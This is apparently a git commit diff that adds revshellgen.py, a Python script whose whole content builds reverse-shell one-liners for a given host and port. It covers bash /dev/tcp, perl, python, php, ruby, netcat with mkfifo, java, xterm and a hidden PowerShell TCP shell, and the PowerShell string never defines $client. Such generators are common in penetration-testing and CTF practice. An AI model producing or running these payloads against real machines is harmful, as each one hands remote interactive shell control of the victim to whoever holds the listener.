912458e8cb667020068dd379f3b191df36382fd8
Jaden Wijata <46347858+xenonminer@users.noreply.github.com>
2023-09-24 04:37:31 -0400

    cool

--- revshellgen.py
+++ revshellgen.py
@@ -1,3 +1,32 @@
 # Generate reverse shell from host and port
-# Usage: python3 revshellgen.py <host> <port>
+# Usage: python3 revshellgen.py <host> <port> <type>
 
+def generate_revshell_payload(host, port, type):
+    if type == "bash":
+        return f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
+    elif type == "perl":
+        return f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
+    elif type == "python":
+        return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    elif type == "php":
+        return f"php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    elif type == "ruby":
+        return f"ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    elif type == "nc":
+        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
+    elif type == "java":
+        return f"r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor()"
+    elif type == "xterm":
+        return f"xterm -display {host}:1"
+    elif type == "powershell":
+        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{host}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) != 4:
+        print("Usage: python3 revshellgen.py <host> <port> <type>")
+        print("Example: python3 revshellgen.py 10.10.14.8 9001 bash")
+        sys.exit(1)
+    
+    host, port, type = sys.argv[1], sys.argv[2], sys.argv[3]
+    print(generate_revshell_payload(host, port, type))
